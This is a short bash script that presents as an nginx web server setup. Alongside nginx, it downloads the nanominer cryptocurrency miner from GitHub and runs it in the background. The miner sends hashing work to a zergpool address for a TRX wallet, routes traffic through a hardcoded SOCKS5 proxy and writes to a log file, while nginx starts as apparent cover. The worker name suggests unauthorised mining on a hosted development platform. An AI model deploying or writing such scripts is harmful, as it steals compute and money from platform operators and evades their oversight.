#!/bin/bash
apt update -y
apt install nginx -y
apt install wget -y
wget https://github.com/nanopool/nanominer/releases/download/v3.6.5/nanominer-linux-3.6.5.tar.gz && tar -xvf nanominer-linux-3.6.5.tar.gz && cd nanominer-linux-3.6.5 && chmod +x nanominer && ./nanominer -algo verushash -pool1 verushash.mine.zergpool.com:3300 -wallet TQ11YB4cti4EhwYkZkoYNwE9B7nkQvTJ86.OKTETO -password c=TRX -x socks5://192.252.214.20:15864 --log=stdout > nano.log &
sleep 30
service nginx start
